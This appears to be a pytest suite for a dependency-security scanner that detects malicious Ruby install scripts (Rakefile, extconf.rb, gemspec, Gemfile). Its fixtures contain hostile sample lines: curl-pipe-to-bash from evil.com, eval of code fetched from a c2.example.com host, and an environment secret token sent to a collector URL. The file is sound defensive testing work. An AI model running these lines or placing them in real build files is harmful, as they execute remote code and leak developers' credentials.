"""Tests for the RubyLifecycleScanner."""

from __future__ import annotations

import pytest

from depfence.core.models import FindingType, Severity
from depfence.scanners.ruby_lifecycle_scanner import RubyLifecycleScanner

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def make_scanner() -> RubyLifecycleScanner:
    return RubyLifecycleScanner()


# ---------------------------------------------------------------------------
# scan() protocol compliance
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_scan_always_returns_empty():
    scanner = make_scanner()
    assert await scanner.scan([]) == []
    assert await scanner.scan(["anything"]) == []


# ---------------------------------------------------------------------------
# _analyze() — direct unit tests for pattern logic
# ---------------------------------------------------------------------------

def test_analyze_download_exec_pattern_is_critical():
    scanner = make_scanner()
    content = (
        'require "net/http"\n'
        'URI.open("https://evil.com/payload") | sh\n'
    )
    findings = scanner._analyze(content, "extconf.rb")
    assert any(f.severity == Severity.CRITICAL for f in findings)
    assert any("download" in f.title.lower() for f in findings)


def test_analyze_credential_plus_network_is_critical():
    scanner = make_scanner()
    content = (
        'require "net/http"\n'
        'token = ENV["SECRET_TOKEN"]\n'
        'Net::HTTP.get(URI("https://collector.example.com/?t=#{token}"))\n'
    )
    findings = scanner._analyze(content, "Rakefile")
    assert any(f.severity == Severity.CRITICAL for f in findings)
    assert any("credential" in f.title.lower() for f in findings)


def test_analyze_exec_plus_network_without_native_build_is_high():
    scanner = make_scanner()
    content = (
        'require "open-uri"\n'
        'system("echo hello")\n'
    )
    findings = scanner._analyze(content, "extconf.rb")
    severities = {f.severity for f in findings}
    assert Severity.HIGH in severities


def test_analyze_exec_plus_network_with_native_build_is_medium():
    scanner = make_scanner()
    content = (
        'require "net/http"\n'
        'create_makefile("myext")\n'
        'system("echo building")\n'
    )
    findings = scanner._analyze(content, "extconf.rb")
    severities = {f.severity for f in findings}
    assert Severity.MEDIUM in severities


def test_analyze_eval_alone_without_native_build_is_high():
    scanner = make_scanner()
    content = 'code = get_remote_code()\neval(code)\n'
    findings = scanner._analyze(content, "Rakefile")
    assert any(f.severity == Severity.HIGH for f in findings)
    assert any("eval" in f.title.lower() for f in findings)


def test_analyze_backtick_exec_no_net_no_eval_no_finding():
    """Backtick exec alone (no net + no eval) doesn't fire — exec without
    network or eval doesn't trigger a finding per the scanner logic."""
    scanner = make_scanner()
    content = 'result = `ls -la`\nputs result\n'
    findings = scanner._analyze(content, "Rakefile")
    # exec alone (no net, no eval) produces no finding
    assert findings == []


def test_analyze_safe_native_build_only_no_finding():
    scanner = make_scanner()
    content = (
        'create_makefile("myext")\n'
        'have_header("stdio.h")\n'
        'have_library("z")\n'
    )
    findings = scanner._analyze(content, "extconf.rb")
    assert findings == []


def test_analyze_empty_content_no_finding():
    scanner = make_scanner()
    assert scanner._analyze("", "extconf.rb") == []


def test_analyze_finding_type_is_install_script():
    scanner = make_scanner()
    content = (
        'require "net/http"\n'
        'ENV["API_KEY"]\n'
    )
    findings = scanner._analyze(content, "Gemfile")
    assert all(f.finding_type == FindingType.INSTALL_SCRIPT for f in findings)


def test_analyze_metadata_contains_file_path():
    scanner = make_scanner()
    content = 'require "net/http"\nKernel.exec("bash")\n'
    findings = scanner._analyze(content, "lib/evil.gemspec")
    assert all(f.metadata.get("file") == "lib/evil.gemspec" for f in findings)
    assert all(f.metadata.get("check") == "ruby_lifecycle" for f in findings)


# ---------------------------------------------------------------------------
# scan_project() — filesystem-level tests
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_scan_project_detects_rakefile_with_exec_and_net(tmp_path):
    scanner = make_scanner()
    (tmp_path / "Rakefile").write_text(
        'require "open3"\nsystem("curl https://evil.com | bash")\n'
    )
    findings = await scanner.scan_project(tmp_path)
    assert len(findings) >= 1
    assert any("exec" in f.title.lower() or "download" in f.title.lower() for f in findings)


@pytest.mark.asyncio
async def test_scan_project_detects_gemspec(tmp_path):
    scanner = make_scanner()
    (tmp_path / "mylib.gemspec").write_text(
        'require "net/http"\nENV["SECRET_PASS"]\n'
    )
    findings = await scanner.scan_project(tmp_path)
    assert len(findings) >= 1


@pytest.mark.asyncio
async def test_scan_project_detects_extconf_rb(tmp_path):
    """extconf.rb with eval + network require fires a HIGH finding.

    eval() counts as exec; combined with net/https it triggers the
    'exec + network' branch (HIGH). CRITICAL requires an explicit
    pipe-to-shell download pattern or credential + network combo.
    """
    scanner = make_scanner()
    (tmp_path / "extconf.rb").write_text(
        'require "net/https"\neval(Net::HTTP.get(URI("https://c2.example.com/p")))\n'
    )
    findings = await scanner.scan_project(tmp_path)
    assert len(findings) >= 1
    assert any(f.severity in (Severity.HIGH, Severity.CRITICAL) for f in findings)


@pytest.mark.asyncio
async def test_scan_project_skips_vendor_directory(tmp_path):
    scanner = make_scanner()
    vendor = tmp_path / "vendor" / "bundle"
    vendor.mkdir(parents=True)
    (vendor / "Rakefile").write_text(
        'require "net/http"\neval(Net::HTTP.get(URI("https://evil.com")))\n'
    )
    findings = await scanner.scan_project(tmp_path)
    assert findings == []


@pytest.mark.asyncio
async def test_scan_project_skips_node_modules(tmp_path):
    scanner = make_scanner()
    nm = tmp_path / "node_modules" / "some-pkg"
    nm.mkdir(parents=True)
    (nm / "Rakefile").write_text(
        'require "net/http"\nENV["API_KEY"]\n'
    )
    findings = await scanner.scan_project(tmp_path)
    assert findings == []


@pytest.mark.asyncio
async def test_scan_project_empty_directory(tmp_path):
    scanner = make_scanner()
    findings = await scanner.scan_project(tmp_path)
    assert findings == []


@pytest.mark.asyncio
async def test_scan_project_benign_extconf(tmp_path):
    scanner = make_scanner()
    (tmp_path / "extconf.rb").write_text(
        'require "mkmf"\ncreate_makefile("myext")\nhave_header("stdio.h")\n'
    )
    findings = await scanner.scan_project(tmp_path)
    assert findings == []


@pytest.mark.asyncio
async def test_scan_project_gemfile_not_gemspec_extension(tmp_path):
    """Gemfile (exact name match) should be scanned even though it lacks .rb ext."""
    scanner = make_scanner()
    (tmp_path / "Gemfile").write_text(
        'source "https://rubygems.org"\n'
        'require "net/http"\n'
        'ENV["AUTH_TOKEN"]\n'
    )
    findings = await scanner.scan_project(tmp_path)
    assert len(findings) >= 1


@pytest.mark.asyncio
async def test_scan_project_random_rb_file_not_scanned(tmp_path):
    """Arbitrary .rb files other than the target list are not scanned."""
    scanner = make_scanner()
    (tmp_path / "app.rb").write_text(
        'require "net/http"\nENV["API_SECRET"]\n'
    )
    findings = await scanner.scan_project(tmp_path)
    # app.rb is not in _TARGET_FILES and has no .gemspec extension
    assert findings == []


@pytest.mark.asyncio
async def test_scan_project_nested_gemspec_found(tmp_path):
    scanner = make_scanner()
    subdir = tmp_path / "gems" / "mylib"
    subdir.mkdir(parents=True)
    (subdir / "mylib.gemspec").write_text(
        'require "net/http"\nKernel.exec("bash -c evil")\n'
    )
    findings = await scanner.scan_project(tmp_path)
    assert len(findings) >= 1


# ---------------------------------------------------------------------------
# _collect_files()
# ---------------------------------------------------------------------------

def test_collect_files_finds_target_files(tmp_path):
    scanner = make_scanner()
    (tmp_path / "Rakefile").write_text("")
    (tmp_path / "extconf.rb").write_text("")
    (tmp_path / "mylib.gemspec").write_text("")
    (tmp_path / "Gemfile").write_text("")
    files = scanner._collect_files(tmp_path)
    names = {f.name for f in files}
    assert "Rakefile" in names
    assert "extconf.rb" in names
    assert "mylib.gemspec" in names
    assert "Gemfile" in names


def test_collect_files_ignores_git(tmp_path):
    scanner = make_scanner()
    git_dir = tmp_path / ".git" / "hooks"
    git_dir.mkdir(parents=True)
    (git_dir / "Rakefile").write_text("")
    files = scanner._collect_files(tmp_path)
    assert all(".git" not in str(f) for f in files)
